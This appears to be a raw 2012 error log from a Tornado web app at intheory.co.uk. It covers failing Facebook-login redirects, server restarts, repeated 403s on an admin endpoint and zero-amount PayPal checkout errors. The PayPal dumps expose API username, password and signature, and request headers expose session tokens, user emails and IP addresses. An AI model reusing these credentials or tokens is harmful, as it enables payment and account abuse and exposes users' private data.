ERROR:root:500 GET /login/fb?code=AQDuLTl_UuNnKTxx6RLb7mzNz7AKTmdW239L4I07Z75fnVTDuAnLLa7egLHSqDvC-WxvKCZyE97_UOKzkEzFu7k1Q8nhC0U-Wpd6MPyNH6SvlRv2MVs0o12dEtDZuhjYS2SeE_BfcpA3cfi9CPJmY8Y6qL_X-MqYm99H6cZMrDjhp0x4b1cpC1Ms2lSwSEXt_9R2ad4fM6zbJdZbFP0Kfuqb (127.0.0.1) 1221.30ms
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8003:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
ERROR:root:Uncaught exception GET /login/fb?code=AQBsAfswEe2wnklM6sp19hWBdEK5jsx5heARPn7VWwTVliCWgWH5rhgynOtlHdLNKm4INUkZ0fGOhhQ55EwNiwN8AJDap8WoXc_TLJjxc3oei1caAShShaKsm_0c8REOa2xnjcZhfNKPa6wP_ZKpoO1qt2_Uip9SZfa1V9ncl6qu_8vlqY3QVHF3eDqq2Z6o8WMx1R_fv4FaJChbeq6eiZlb (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login/fb?code=AQBsAfswEe2wnklM6sp19hWBdEK5jsx5heARPn7VWwTVliCWgWH5rhgynOtlHdLNKm4INUkZ0fGOhhQ55EwNiwN8AJDap8WoXc_TLJjxc3oei1caAShShaKsm_0c8REOa2xnjcZhfNKPa6wP_ZKpoO1qt2_Uip9SZfa1V9ncl6qu_8vlqY3QVHF3eDqq2Z6o8WMx1R_fv4FaJChbeq6eiZlb', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Referer': 'http://intheory.co.uk/login/options', 'X-Real-Ip': '86.167.54.3', 'Cookie': '_xsrf=e8ef016bea9b4fd1b0e3ed45ff4957c5; __utma=188782963.489109469.1349903373.1350910182.1350930463.25; __utmb=188782963.22.10.1350930463; __utmc=188782963; __utmz=188782963.1349903373.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 128, in _on_login
    self.redirect(next)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 466, in redirect
    url = re.sub(b(r"[\x00-\x20]+"), "", utf8(url))
  File "/www/virtualenv/intheory/lib/python2.7/re.py", line 151, in sub
    return _compile(pattern, flags).sub(repl, string, count)
TypeError: expected string or buffer
ERROR:root:500 GET /login/fb?code=AQBsAfswEe2wnklM6sp19hWBdEK5jsx5heARPn7VWwTVliCWgWH5rhgynOtlHdLNKm4INUkZ0fGOhhQ55EwNiwN8AJDap8WoXc_TLJjxc3oei1caAShShaKsm_0c8REOa2xnjcZhfNKPa6wP_ZKpoO1qt2_Uip9SZfa1V9ncl6qu_8vlqY3QVHF3eDqq2Z6o8WMx1R_fv4FaJChbeq6eiZlb (127.0.0.1) 1019.23ms
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8001:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
ERROR:root:Uncaught exception GET /login/fb?code=AQDKXAwEmMEejH6AiitdFMTzyysHn1XNW0v8YDg3jPAt5CjJ7nWF_nQlkYFk2PyiL0ZnBnH0mVvGbXLnMaQzgSKjNGIMAIROUsuQAE65XhcFhuSYvGSPLJMxoMHROvDLU2_IbqqVUYLvRwj9CnnTAJ6i7d3onYpIJZtinGzWHyNDXlYhNz8U1m8U1CrnwjmaqzTKH9Mxop4fC5_Dc71UDo6J (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login/fb?code=AQDKXAwEmMEejH6AiitdFMTzyysHn1XNW0v8YDg3jPAt5CjJ7nWF_nQlkYFk2PyiL0ZnBnH0mVvGbXLnMaQzgSKjNGIMAIROUsuQAE65XhcFhuSYvGSPLJMxoMHROvDLU2_IbqqVUYLvRwj9CnnTAJ6i7d3onYpIJZtinGzWHyNDXlYhNz8U1m8U1CrnwjmaqzTKH9Mxop4fC5_Dc71UDo6J', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0', 'Connection': 'close', 'Referer': 'http://intheory.co.uk/login/options', 'X-Real-Ip': '86.167.54.3', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFHSVJPMkdkMWNaQzBLZGx0YThPbkdWR2ZMdUtsbkFjblNNdTVGRUo4cXpNWkJreHRmWkE4WkE5QUY5eTI3cEo2WkJEWHVQbjJvRHJWbUFYZGNvMnM2MmM5TGlPc0xBWkRaRA==|1350933211|85146b90a2a6500c4b7fc81a7d2d71774e6f2b59"; user_type="ZmI=|1350933211|04e8499b45544baf7d8acc1d307f831a4a3e2667"'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 128, in _on_login
    self.redirect(next)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 466, in redirect
    url = re.sub(b(r"[\x00-\x20]+"), "", utf8(url))
  File "/www/virtualenv/intheory/lib/python2.7/re.py", line 151, in sub
    return _compile(pattern, flags).sub(repl, string, count)
TypeError: expected string or buffer
ERROR:root:500 GET /login/fb?code=AQDKXAwEmMEejH6AiitdFMTzyysHn1XNW0v8YDg3jPAt5CjJ7nWF_nQlkYFk2PyiL0ZnBnH0mVvGbXLnMaQzgSKjNGIMAIROUsuQAE65XhcFhuSYvGSPLJMxoMHROvDLU2_IbqqVUYLvRwj9CnnTAJ6i7d3onYpIJZtinGzWHyNDXlYhNz8U1m8U1CrnwjmaqzTKH9Mxop4fC5_Dc71UDo6J (127.0.0.1) 1087.17ms
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8000:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
ERROR:root:Uncaught exception GET /login/fb?code=AQBGUNkotwvtzRgSulNG4jL_CiDNZZFRtDwEk2wcv6uF3bdm1ZXvD0--7f4QVncl9YNzesm3kqSskPsqoN3LCeY69mPkS9XT3LMtV33hHP-uKGWwa1spZ2ACgPGsuQhrwuCudkaYZg5EUoku3ycar-xZjFjqw4fo1BfpiHRFbHaGkDaQtwLf2AhTAlAwgKG4il1_e7gFey6TAOy4LsO-I-er (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login/fb?code=AQBGUNkotwvtzRgSulNG4jL_CiDNZZFRtDwEk2wcv6uF3bdm1ZXvD0--7f4QVncl9YNzesm3kqSskPsqoN3LCeY69mPkS9XT3LMtV33hHP-uKGWwa1spZ2ACgPGsuQhrwuCudkaYZg5EUoku3ycar-xZjFjqw4fo1BfpiHRFbHaGkDaQtwLf2AhTAlAwgKG4il1_e7gFey6TAOy4LsO-I-er', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Referer': 'http://intheory.co.uk/login/options', 'X-Real-Ip': '86.167.54.3', 'Cookie': '_xsrf=e8ef016bea9b4fd1b0e3ed45ff4957c5; access_token=QUFBRzZsTmNzNkdjQkFDWG9BQmllRndUWkF2QjFZWDJ5d3FaQ1pCVllwTWRybjRFcHVVSDBJdjhZbDVGWFByU04xTGMwQVhCRVVpMmRhdjhMOFFEYUdKa1dlUEpvN2taQjFMRTc0V1V0S3daRFpE|1350933213|e190ca56f6b8ee3db336078d214ba2a981cd9c40; user_type="ZmI=|1350933213|de3dc4dce2e03a6b8463ed9c7c82f75985384eb8"; __utma=188782963.489109469.1349903373.1350910182.1350930463.25; __utmb=188782963.24.10.1350930463; __utmc=188782963; __utmz=188782963.1349903373.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 128, in _on_login
    self.redirect(next)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 466, in redirect
    url = re.sub(b(r"[\x00-\x20]+"), "", utf8(url))
  File "/www/virtualenv/intheory/lib/python2.7/re.py", line 151, in sub
    return _compile(pattern, flags).sub(repl, string, count)
TypeError: expected string or buffer
ERROR:root:500 GET /login/fb?code=AQBGUNkotwvtzRgSulNG4jL_CiDNZZFRtDwEk2wcv6uF3bdm1ZXvD0--7f4QVncl9YNzesm3kqSskPsqoN3LCeY69mPkS9XT3LMtV33hHP-uKGWwa1spZ2ACgPGsuQhrwuCudkaYZg5EUoku3ycar-xZjFjqw4fo1BfpiHRFbHaGkDaQtwLf2AhTAlAwgKG4il1_e7gFey6TAOy4LsO-I-er (127.0.0.1) 986.09ms
None is not a valid ObjectId
ERROR:intheory-8001:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8001:Ajax request failed.
Server started successfully.
Server started successfully.
INFO:intheory-8001:Server started successfully.
INFO:intheory-8000:Server started successfully.
Server started successfully.
INFO:intheory-8002:Server started successfully.
Server started successfully.
INFO:intheory-8003:Server started successfully.
ERROR:paypal.interface:A PayPal API error was encountered.
ERROR:paypal.interface:PayPal NVP Query Key/Vals:
{'CANCELURL': 'http://www.intheory.co.uk/payment',
 'EMAIL': u'mac-cubitt@hotmail.com',
 'LANDINGPAGE': 'Billing',
 'METHOD': 'SetExpressCheckout',
 'PAYMENTREQUEST_0_AMT': '0.00',
 'PAYMENTREQUEST_0_CURRENCYCODE': 'GBP',
 'PAYMENTREQUEST_0_DESC': 'Intheory Web App - \xc2\xa30.00 - Full Access',
 'PAYMENTREQUEST_0_PAYMENTACTION': 'Order',
 'PWD': 'UZQZC8RD228TZEU4',
 'RETURNURL': 'http://www.intheory.co.uk/payment/do',
 'SIGNATURE': ('AA6FKP55XSbL3HvSeGi8V-Fb.Yv8A47KsUXj1CQw531s.vd-HCMVUsrL',),
 'USER': 'zahid_api1.intheory.co.uk',
 'VERSION': '72.0'}
ERROR:paypal.interface:PayPal NVP Query Response
ERROR:paypal.interface:{u'ACK': [u'Failure'],
 u'BUILD': [u'3926908'],
 u'CORRELATIONID': [u'af6f96b739821'],
 u'L_ERRORCODE0': [u'10525'],
 u'L_LONGMESSAGE0': [u'This transaction cannot be processed. The amount to be charged is zero.'],
 u'L_SEVERITYCODE0': [u'Error'],
 u'L_SHORTMESSAGE0': [u'Invalid Data'],
 u'TIMESTAMP': [u'2012-10-22T19:19:22Z'],
 u'VERSION': [u'72.0']}
Error while redirecting user with id 50859ab28e4c8537a576966e to PayPal: u'This transaction cannot be processed. The amount to be charged is zero.' (Error Code: 10525)
WARNING:intheory-8000:Error while redirecting user with id 50859ab28e4c8537a576966e to PayPal: u'This transaction cannot be processed. The amount to be charged is zero.' (Error Code: 10525)
ERROR:root:Uncaught exception GET /payment/redirect?code=P09CJHWL&_xsrf=55d664cb08c64d7db1dbc46ac2401b3c (127.0.0.1)
HTTPRequest(protocol='http', host='intheory.co.uk', method='GET', uri='/payment/redirect?code=P09CJHWL&_xsrf=55d664cb08c64d7db1dbc46ac2401b3c', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-us', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.25 (KHTML, like Gecko) Version/6.0 Safari/536.25', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://intheory.co.uk/payment', 'X-Real-Ip': '2.127.93.247', 'Cookie': '__utma=188782963.1810950740.1350933047.1350933047.1350933047.1; __utmb=188782963.13.10.1350933047; __utmc=188782963; __utmz=188782963.1350933047.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); access_token=TWFjQ3ViaXR0|1350933170|6998053093c405f5bca946149ed687d80a70cd53; user_type="aW50aGVvcnk=|1350933170|45279b0b0cdab0fe32c40b9a314bd94b3728b7b0"; _xsrf=55d664cb08c64d7db1dbc46ac2401b3c'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 2 arguments (1 given)
ERROR:root:500 GET /payment/redirect?code=P09CJHWL&_xsrf=55d664cb08c64d7db1dbc46ac2401b3c (127.0.0.1) 1126.20ms
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8002:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
ERROR:root:Uncaught exception GET /login/fb?code=AQAiIstRPWYI59GQN-6uIMtLaYrd14zyiBtPCcwvRRTkXTBBB4Wa1ZQmRkph7rxCDTZuNSIHg0GZtow_nYlEgXtkrjZFGejj3Tw6JDjd6KrPw-KYy85d_YpZO6jEegRb2YM-ks11cruMRh5F_vUsR-pXsSKmNDaFXJ4XL_zFAh13lyAia1skScO1n3hwSED274SMuSNlyEiEyvwEf8SsD_ge (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login/fb?code=AQAiIstRPWYI59GQN-6uIMtLaYrd14zyiBtPCcwvRRTkXTBBB4Wa1ZQmRkph7rxCDTZuNSIHg0GZtow_nYlEgXtkrjZFGejj3Tw6JDjd6KrPw-KYy85d_YpZO6jEegRb2YM-ks11cruMRh5F_vUsR-pXsSKmNDaFXJ4XL_zFAh13lyAia1skScO1n3hwSED274SMuSNlyEiEyvwEf8SsD_ge', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Referer': 'http://intheory.co.uk/login/options', 'X-Real-Ip': '86.167.54.3', 'Cookie': '_xsrf=e8ef016bea9b4fd1b0e3ed45ff4957c5; access_token=QUFBRzZsTmNzNkdjQkFDWG9BQmllRndUWkF2QjFZWDJ5d3FaQ1pCVllwTWRybjRFcHVVSDBJdjhZbDVGWFByU04xTGMwQVhCRVVpMmRhdjhMOFFEYUdKa1dlUEpvN2taQjFMRTc0V1V0S3daRFpE|1350933512|78f8671aedfc692e64db48174a0cc9f435eea6ef; user_type="ZmI=|1350933512|c04535104401daee80c6f219dbeebf8d8fe4bc6d"; __utma=188782963.489109469.1349903373.1350910182.1350930463.25; __utmb=188782963.26.10.1350930463; __utmc=188782963; __utmz=188782963.1349903373.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 129, in _on_login
    self.redirect(next)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 466, in redirect
    url = re.sub(b(r"[\x00-\x20]+"), "", utf8(url))
  File "/www/virtualenv/intheory/lib/python2.7/re.py", line 151, in sub
    return _compile(pattern, flags).sub(repl, string, count)
TypeError: expected string or buffer
ERROR:root:500 GET /login/fb?code=AQAiIstRPWYI59GQN-6uIMtLaYrd14zyiBtPCcwvRRTkXTBBB4Wa1ZQmRkph7rxCDTZuNSIHg0GZtow_nYlEgXtkrjZFGejj3Tw6JDjd6KrPw-KYy85d_YpZO6jEegRb2YM-ks11cruMRh5F_vUsR-pXsSKmNDaFXJ4XL_zFAh13lyAia1skScO1n3hwSED274SMuSNlyEiEyvwEf8SsD_ge (127.0.0.1) 1146.61ms
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8000:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
ERROR:root:Uncaught exception GET /login/fb?code=AQAFKnUShSJRnG4GBZoCw1ApOPwVu8vdAjHXe5I8QOk70m45iYd5_5sr2ZLNwPN0lJTuiEWp-MSSCGY-MLVCkxj6sUw540EGmuo7HkV2ozuAVLiJngdcCt4Fo-pVptC3NbTZrEkUXGWSEWZJfoEMVYRXtXQv1WE5jOt7Kug4RmCdhH_jqEDNQS-WhMqWMsFzRI6ecB6ab5MN86RcG3utQ_H2 (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login/fb?code=AQAFKnUShSJRnG4GBZoCw1ApOPwVu8vdAjHXe5I8QOk70m45iYd5_5sr2ZLNwPN0lJTuiEWp-MSSCGY-MLVCkxj6sUw540EGmuo7HkV2ozuAVLiJngdcCt4Fo-pVptC3NbTZrEkUXGWSEWZJfoEMVYRXtXQv1WE5jOt7Kug4RmCdhH_jqEDNQS-WhMqWMsFzRI6ecB6ab5MN86RcG3utQ_H2', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Referer': 'http://intheory.co.uk/login/options', 'X-Real-Ip': '86.167.54.3', 'Cookie': '_xsrf=b032c94960104451b21c1d9bfef33d34; access_token="QUFBRzZsTmNzNkdjQkFGb1pDU2hRVFN0bFh2cUlVVTI5TkdRSUlNMjhneVpCYUFaQk16VGxHNFJ6RzVEc0lORUZIMUVvUDIxbkdWbm50aG5xdk0waDQzZHNtMnl3amRpanhDd2oyUTdnZ1pEWkQ=|1350925718|533895f79983d59dd049c9ef9142c986b40c03a8"; user_type="ZmI=|1350925718|c696d6c1d60e865f01e688fef2cb8fc0af7063e5"; __utma=188782963.1383997649.1347899066.1350928772.1350932148.71; __utmb=188782963.4.10.1350932148; __utmc=188782963; __utmz=188782963.1347899066.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 129, in _on_login
    self.redirect(next)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 466, in redirect
    url = re.sub(b(r"[\x00-\x20]+"), "", utf8(url))
  File "/www/virtualenv/intheory/lib/python2.7/re.py", line 151, in sub
    return _compile(pattern, flags).sub(repl, string, count)
TypeError: expected string or buffer
ERROR:root:500 GET /login/fb?code=AQAFKnUShSJRnG4GBZoCw1ApOPwVu8vdAjHXe5I8QOk70m45iYd5_5sr2ZLNwPN0lJTuiEWp-MSSCGY-MLVCkxj6sUw540EGmuo7HkV2ozuAVLiJngdcCt4Fo-pVptC3NbTZrEkUXGWSEWZJfoEMVYRXtXQv1WE5jOt7Kug4RmCdhH_jqEDNQS-WhMqWMsFzRI6ecB6ab5MN86RcG3utQ_H2 (127.0.0.1) 982.19ms
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8003:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
ERROR:root:Uncaught exception GET /login/fb?code=AQAFKnUShSJRnG4GBZoCw1ApOPwVu8vdAjHXe5I8QOk70m45iYd5_5sr2ZLNwPN0lJTuiEWp-MSSCGY-MLVCkxj6sUw540EGmuo7HkV2ozuAVLiJngdcCt4Fo-pVptC3NbTZrEkUXGWSEWZJfoEMVYRXtXQv1WE5jOt7Kug4RmCdhH_jqEDNQS-WhMqWMsFzRI6ecB6ab5MN86RcG3utQ_H2 (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login/fb?code=AQAFKnUShSJRnG4GBZoCw1ApOPwVu8vdAjHXe5I8QOk70m45iYd5_5sr2ZLNwPN0lJTuiEWp-MSSCGY-MLVCkxj6sUw540EGmuo7HkV2ozuAVLiJngdcCt4Fo-pVptC3NbTZrEkUXGWSEWZJfoEMVYRXtXQv1WE5jOt7Kug4RmCdhH_jqEDNQS-WhMqWMsFzRI6ecB6ab5MN86RcG3utQ_H2', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '_xsrf=b032c94960104451b21c1d9bfef33d34; __utma=188782963.1383997649.1347899066.1350928772.1350932148.71; __utmb=188782963.4.10.1350932148; __utmc=188782963; __utmz=188782963.1347899066.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); access_token="QUFBRzZsTmNzNkdjQkFGb1pDU2hRVFN0bFh2cUlVVTI5TkdRSUlNMjhneVpCYUFaQk16VGxHNFJ6RzVEc0lORUZIMUVvUDIxbkdWbm50aG5xdk0waDQzZHNtMnl3amRpanhDd2oyUTdnZ1pEWkQ=|1350933613|c99e41a313195020e193ed2c0a3c5037b554d5dc"; user_type="ZmI=|1350933613|8fde19717d1b9a5c1204d2678ccfd6ba339bd84c"', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '86.167.54.3'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 129, in _on_login
    self.redirect(next)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 466, in redirect
    url = re.sub(b(r"[\x00-\x20]+"), "", utf8(url))
  File "/www/virtualenv/intheory/lib/python2.7/re.py", line 151, in sub
    return _compile(pattern, flags).sub(repl, string, count)
TypeError: expected string or buffer
ERROR:root:500 GET /login/fb?code=AQAFKnUShSJRnG4GBZoCw1ApOPwVu8vdAjHXe5I8QOk70m45iYd5_5sr2ZLNwPN0lJTuiEWp-MSSCGY-MLVCkxj6sUw540EGmuo7HkV2ozuAVLiJngdcCt4Fo-pVptC3NbTZrEkUXGWSEWZJfoEMVYRXtXQv1WE5jOt7Kug4RmCdhH_jqEDNQS-WhMqWMsFzRI6ecB6ab5MN86RcG3utQ_H2 (127.0.0.1) 1070.78ms
Server started successfully.
Server started successfully.
INFO:intheory-8000:Server started successfully.
INFO:intheory-8001:Server started successfully.
Server started successfully.
INFO:intheory-8002:Server started successfully.
Server started successfully.
INFO:intheory-8003:Server started successfully.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8003:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8003:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 131, in _on_login
    self.redirect("/dashboard")
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 459, in redirect
    raise Exception("Cannot redirect after headers have been written")
Exception: Cannot redirect after headers have been written
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8003:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
HTTP 403: Forbidden
ERROR:intheory-8000:HTTP 403: Forbidden
WARNING:root:403 POST /admin/users/moderator (127.0.0.1) 152.92ms
HTTP 403: Forbidden
ERROR:intheory-8003:HTTP 403: Forbidden
WARNING:root:403 POST /admin/users/moderator (127.0.0.1) 94.93ms
HTTP 403: Forbidden
ERROR:intheory-8002:HTTP 403: Forbidden
WARNING:root:403 POST /admin/users/moderator (127.0.0.1) 105.43ms
HTTP 403: Forbidden
ERROR:intheory-8001:HTTP 403: Forbidden
WARNING:root:403 POST /admin/users/moderator (127.0.0.1) 148.28ms
HTTP 403: Forbidden
ERROR:intheory-8000:HTTP 403: Forbidden
WARNING:root:403 POST /admin/users/moderator (127.0.0.1) 117.70ms
HTTP 403: Forbidden
ERROR:intheory-8003:HTTP 403: Forbidden
WARNING:root:403 POST /admin/users/moderator (127.0.0.1) 100.25ms
HTTP 403: Forbidden
ERROR:intheory-8002:HTTP 403: Forbidden
WARNING:root:403 POST /admin/users/moderator (127.0.0.1) 110.10ms
HTTP 403: Forbidden
ERROR:intheory-8001:HTTP 403: Forbidden
WARNING:root:403 POST /admin/users/moderator (127.0.0.1) 78.34ms
HTTP 403: Forbidden
ERROR:intheory-8000:HTTP 403: Forbidden
WARNING:root:403 POST /admin/users/moderator (127.0.0.1) 91.23ms
HTTP 403: Forbidden
ERROR:intheory-8003:HTTP 403: Forbidden
WARNING:root:403 POST /admin/users/moderator (127.0.0.1) 81.53ms
HTTP 403: Forbidden
ERROR:intheory-8002:HTTP 403: Forbidden
WARNING:root:403 POST /admin/users/moderator (127.0.0.1) 131.73ms
HTTP 403: Forbidden
ERROR:intheory-8001:HTTP 403: Forbidden
WARNING:root:403 POST /admin/users/moderator (127.0.0.1) 153.67ms
HTTP 403: Forbidden
ERROR:intheory-8000:HTTP 403: Forbidden
WARNING:root:403 POST /admin/users/moderator (127.0.0.1) 96.35ms
Intheory user with id 5085a0c98e4c85424275f05a has successfully registered.
INFO:intheory-8002:Intheory user with id 5085a0c98e4c85424275f05a has successfully registered.
ERROR:paypal.interface:A PayPal API error was encountered.
ERROR:paypal.interface:PayPal NVP Query Key/Vals:
{'CANCELURL': 'http://www.intheory.co.uk/payment',
 'EMAIL': u'bas@gmail.com',
 'LANDINGPAGE': 'Billing',
 'METHOD': 'SetExpressCheckout',
 'PAYMENTREQUEST_0_AMT': '0.00',
 'PAYMENTREQUEST_0_CURRENCYCODE': 'GBP',
 'PAYMENTREQUEST_0_DESC': 'Intheory Web App - \xc2\xa30.00 - Full Access',
 'PAYMENTREQUEST_0_PAYMENTACTION': 'Order',
 'PWD': 'UZQZC8RD228TZEU4',
 'RETURNURL': 'http://www.intheory.co.uk/payment/do',
 'SIGNATURE': ('AA6FKP55XSbL3HvSeGi8V-Fb.Yv8A47KsUXj1CQw531s.vd-HCMVUsrL',),
 'USER': 'zahid_api1.intheory.co.uk',
 'VERSION': '72.0'}
ERROR:paypal.interface:PayPal NVP Query Response
ERROR:paypal.interface:{u'ACK': [u'Failure'],
 u'BUILD': [u'3926908'],
 u'CORRELATIONID': [u'd8c94ea382b40'],
 u'L_ERRORCODE0': [u'10525'],
 u'L_LONGMESSAGE0': [u'This transaction cannot be processed. The amount to be charged is zero.'],
 u'L_SEVERITYCODE0': [u'Error'],
 u'L_SHORTMESSAGE0': [u'Invalid Data'],
 u'TIMESTAMP': [u'2012-10-22T19:39:54Z'],
 u'VERSION': [u'72.0']}
Error while redirecting user with id 5085a0c98e4c85424275f05a to PayPal: u'This transaction cannot be processed. The amount to be charged is zero.' (Error Code: 10525)
